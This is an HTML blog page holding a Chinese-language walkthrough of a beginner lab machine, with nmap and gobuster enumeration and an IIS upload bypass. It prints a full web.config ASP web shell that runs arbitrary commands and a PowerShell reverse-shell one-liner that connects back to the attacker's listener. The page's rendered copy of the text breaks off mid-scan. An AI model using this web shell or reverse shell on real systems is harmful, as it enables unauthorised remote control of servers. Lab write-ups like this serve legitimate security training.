<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://gc.zgo.at/count.js'></script>
    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
<meta name="description" content="# thl_ensala-papas

# 0.简介

**靶机**：[thehackerslabs - ensala-papas](https://thehackerslabs.com/ensala-papas/)
**难度**：初学者
**目标 IP**：192.168.205.221
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手，先探测端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:17 CST
Nmap scan report for 192.168.205.221
Host is up (0.00068s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3167/tcp  filtered nowcontact
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
                                                                   
```

再探测详细服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:19 CST
Nmap scan report for 192.168.205.221
Host is up (0.00046s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.00 seconds
                                                                
```

探测UDP服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sU -n -T4 --top-ports 100 192.168.205.221 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:27 CST
Nmap scan report for 192.168.205.221
Host is up (0.00048s latency).
Not shown: 62 closed udp ports (port-unreach), 37 open|filtered udp ports (no-response)
PORT    STATE SERVICE
137/udp open  netbios-ns
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 69.21 seconds
```

使用`nmap`扫描漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap --script=vuln -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:24 CST
Nmap scan report for 192.168.205.221
Host is up (0.00056s latency).

PORT      STATE SERVICE
80/tcp    open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 148.15 seconds
                                              
```

目前为止，感兴趣的端口有 **80**、**445，**  windwos的靶机445的优先级高于80，所以我们先测试445端口有没有利用点

---

# 2.踩点

## 2.1 port 445

```bash
┌──(kali㉿kali)-[~/test]
└─$ netexec smb 192.168.205.221 -u guest -p '' --shares
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                            
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [-] WIN-4QU3QNHNK7E\guest: STATUS_LOGON_FAILURE 
                                                                                                    
```

它没有开放访客登录，所以可以直接去观察80端口了

## 2.2 port 80

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x aspx,asp,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,html,txt,md,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
/*docroot*.aspx       (Status: 400) [Size: 20]
/*.aspx               (Status: 400) [Size: 20]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 20]
/**http%3a.aspx       (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/http%3A.aspx         (Status: 400) [Size: 20]
/*http%3A.aspx        (Status: 400) [Size: 20]
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 20]
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 20]
Progress: 345575 / 7642998 (4.52%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 345933 / 7642998 (4.53%)
===============================================================
Finished
===============================================================

```

扫到一个`/zoc.aspx`，去浏览器查看了一下，是一个上传页，并在注释发现了一个目录路径`/Subiditosdetono/`，当我们把目录加入网址会看到如下内容

![image](https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815)

我们可以看到有一个`config`文件，当我们点击时会发现**404**无法访问，那我们还是回上传页试试能不能上传**shell**

![image](https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2)

不允许我们上传`.aspx`后缀的文件，根据之前访问`/Subiditosdetono/`看到有`config`文件，我们可以从中知道，可以上传`config`文件，我们去[hacktricks](https://book.hacktricks.xyz/)搜索一下看`config`文件可不可以做`shell`

![image](https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd)

找到了一点有意思的东西，我们把它的示例[复制](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)下来，上传运行

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat web.config 
<?xml version='1.0' encoding='UTF-8'?>
<configuration>
   <system.webServer>
      <handlers accessPolicy='Read, Script, Write'>
         <add name='web_config' path='*.config' verb='*' modules='IsapiModule' scriptProcessor='%windir%\system32\inetsrv\asp.dll' resourceType='Unspecified' requireAccess='Write' preCondition='bitness64' />       
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension='.config' />
            </fileExtensions>
            <hiddenSegments>
               <remove segment='web.config' />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write('-'&'->')%>
<%
Set oScript = Server.CreateObject('WSCRIPT.SHELL')
Set oScriptNet = Server.CreateObject('WSCRIPT.NETWORK')
Set oFileSys = Server.CreateObject('Scripting.FileSystemObject')

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject('WScript.Shell')
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action='' method='GET'>
<input type='text' name='cmd' size=45 value='<%= szCMD %>'>
<input type='submit' value='Run'>
</FORM>

<PRE>
<%= '\\' & oScriptNet.ComputerName & '\' & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables('server_name'))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables('server_port'))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables('server_software'))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables('LOCAL_ADDR'))%>
<% szCMD = request('cmd')
thisDir = getCommandOutput('cmd /c' & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>



<%Response.write('<!-'&'-') %>
-->
        
```

![image](https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc)

弹个**shell**回来

```bash
powershell -nop -c '$client = New-Object System.Net.Sockets.TCPClient('192.168.205.141',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

#攻击机
┌──(kali㉿kali)-[~/test/netcat]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49159
whoami
win-4qu3qnhnk7e\info
```

---

# 3.提权

拿到**shell**后看看权限

```bash
PS C:\users\info> whoami /priv

INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado     
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado

```

我们有 `SeImpersonatePrivilege`权限，所以我们可以使用 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** 工具来提升权限。">
<meta property="og:title" content="thl_ensala-papas">
<meta property="og:description" content="# thl_ensala-papas

# 0.简介

**靶机**：[thehackerslabs - ensala-papas](https://thehackerslabs.com/ensala-papas/)
**难度**：初学者
**目标 IP**：192.168.205.221
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手，先探测端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:17 CST
Nmap scan report for 192.168.205.221
Host is up (0.00068s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3167/tcp  filtered nowcontact
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
                                                                   
```

再探测详细服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:19 CST
Nmap scan report for 192.168.205.221
Host is up (0.00046s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.00 seconds
                                                                
```

探测UDP服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sU -n -T4 --top-ports 100 192.168.205.221 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:27 CST
Nmap scan report for 192.168.205.221
Host is up (0.00048s latency).
Not shown: 62 closed udp ports (port-unreach), 37 open|filtered udp ports (no-response)
PORT    STATE SERVICE
137/udp open  netbios-ns
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 69.21 seconds
```

使用`nmap`扫描漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap --script=vuln -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:24 CST
Nmap scan report for 192.168.205.221
Host is up (0.00056s latency).

PORT      STATE SERVICE
80/tcp    open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 148.15 seconds
                                              
```

目前为止，感兴趣的端口有 **80**、**445，**  windwos的靶机445的优先级高于80，所以我们先测试445端口有没有利用点

---

# 2.踩点

## 2.1 port 445

```bash
┌──(kali㉿kali)-[~/test]
└─$ netexec smb 192.168.205.221 -u guest -p '' --shares
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                            
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [-] WIN-4QU3QNHNK7E\guest: STATUS_LOGON_FAILURE 
                                                                                                    
```

它没有开放访客登录，所以可以直接去观察80端口了

## 2.2 port 80

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x aspx,asp,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,html,txt,md,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
/*docroot*.aspx       (Status: 400) [Size: 20]
/*.aspx               (Status: 400) [Size: 20]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 20]
/**http%3a.aspx       (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/http%3A.aspx         (Status: 400) [Size: 20]
/*http%3A.aspx        (Status: 400) [Size: 20]
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 20]
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 20]
Progress: 345575 / 7642998 (4.52%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 345933 / 7642998 (4.53%)
===============================================================
Finished
===============================================================

```

扫到一个`/zoc.aspx`，去浏览器查看了一下，是一个上传页，并在注释发现了一个目录路径`/Subiditosdetono/`，当我们把目录加入网址会看到如下内容

![image](https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815)

我们可以看到有一个`config`文件，当我们点击时会发现**404**无法访问，那我们还是回上传页试试能不能上传**shell**

![image](https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2)

不允许我们上传`.aspx`后缀的文件，根据之前访问`/Subiditosdetono/`看到有`config`文件，我们可以从中知道，可以上传`config`文件，我们去[hacktricks](https://book.hacktricks.xyz/)搜索一下看`config`文件可不可以做`shell`

![image](https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd)

找到了一点有意思的东西，我们把它的示例[复制](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)下来，上传运行

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat web.config 
<?xml version='1.0' encoding='UTF-8'?>
<configuration>
   <system.webServer>
      <handlers accessPolicy='Read, Script, Write'>
         <add name='web_config' path='*.config' verb='*' modules='IsapiModule' scriptProcessor='%windir%\system32\inetsrv\asp.dll' resourceType='Unspecified' requireAccess='Write' preCondition='bitness64' />       
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension='.config' />
            </fileExtensions>
            <hiddenSegments>
               <remove segment='web.config' />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write('-'&'->')%>
<%
Set oScript = Server.CreateObject('WSCRIPT.SHELL')
Set oScriptNet = Server.CreateObject('WSCRIPT.NETWORK')
Set oFileSys = Server.CreateObject('Scripting.FileSystemObject')

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject('WScript.Shell')
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action='' method='GET'>
<input type='text' name='cmd' size=45 value='<%= szCMD %>'>
<input type='submit' value='Run'>
</FORM>

<PRE>
<%= '\\' & oScriptNet.ComputerName & '\' & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables('server_name'))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables('server_port'))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables('server_software'))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables('LOCAL_ADDR'))%>
<% szCMD = request('cmd')
thisDir = getCommandOutput('cmd /c' & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>



<%Response.write('<!-'&'-') %>
-->
        
```

![image](https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc)

弹个**shell**回来

```bash
powershell -nop -c '$client = New-Object System.Net.Sockets.TCPClient('192.168.205.141',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

#攻击机
┌──(kali㉿kali)-[~/test/netcat]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49159
whoami
win-4qu3qnhnk7e\info
```

---

# 3.提权

拿到**shell**后看看权限

```bash
PS C:\users\info> whoami /priv

INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado     
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado

```

我们有 `SeImpersonatePrivilege`权限，所以我们可以使用 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** 工具来提升权限。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7r1UMPHK.github.io/post/thl_ensala-papas.html">
<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
<title>thl_ensala-papas</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />


</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">thl_ensala-papas</h1>
<div class="title-right">
    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/118" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><h1>thl_ensala-papas</h1>
<h1>0.简介</h1>
<p><strong>靶机</strong>：<a href="https://thehackerslabs.com/ensala-papas/" rel="nofollow">thehackerslabs - ensala-papas</a><br>
<strong>难度</strong>：初学者<br>
<strong>目标 IP</strong>：192.168.205.221<br>
<strong>本机 IP</strong>：192.168.205.141</p>
<hr>
<h1>1.扫描</h1>
<p><code class="notranslate">nmap</code>起手，先探测端口</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:17 CST
Nmap scan report <span class="pl-k">for</span> 192.168.205.221
Host is up (0.00068s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3167/tcp  filtered nowcontact
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 11.77 seconds
                                                                   </pre></div>
<p>再探测详细服务</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:19 CST
Nmap scan report <span class="pl-k">for</span> 192.168.205.221
Host is up (0.00046s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds<span class="pl-k">?</span>
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7<span class="pl-k">|</span>2008<span class="pl-k">|</span>8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: OS: Windows<span class="pl-k">;</span> CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 60.00 seconds
                                                                </pre></div>
<p>探测UDP服务</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ nmap -sU -n -T4 --top-ports 100 192.168.205.221 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:27 CST
Nmap scan report <span class="pl-k">for</span> 192.168.205.221
Host is up (0.00048s latency).
Not shown: 62 closed udp ports (port-unreach), 37 open<span class="pl-k">|</span>filtered udp ports (no-response)
PORT    STATE SERVICE
137/udp open  netbios-ns
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 69.21 seconds</pre></div>
<p>使用<code class="notranslate">nmap</code>扫描漏洞</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
└─$ nmap --script=vuln -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:24 CST
Nmap scan report <span class="pl-k">for</span> 192.168.205.221
Host is up (0.00056s latency).

PORT      STATE SERVICE
80/tcp    open  http
<span class="pl-k">|</span>_http-csrf: Couldn<span class="pl-s"><span class="pl-pds">'</span>t find any CSRF vulnerabilities.</span>
<span class="pl-s">|_http-stored-xss: Couldn<span class="pl-pds">'</span></span>t find any stored XSS vulnerabilities.
<span class="pl-k">|</span>_http-dombased-xss: Couldn<span class="pl-s"><span class="pl-pds">'</span>t find any DOM based XSS.</span>
<span class="pl-s">135/tcp   open  msrpc</span>
<span class="pl-s">139/tcp   open  netbios-ssn</span>
<span class="pl-s">445/tcp   open  microsoft-ds</span>
<span class="pl-s">47001/tcp open  winrm</span>
<span class="pl-s">49152/tcp open  unknown</span>
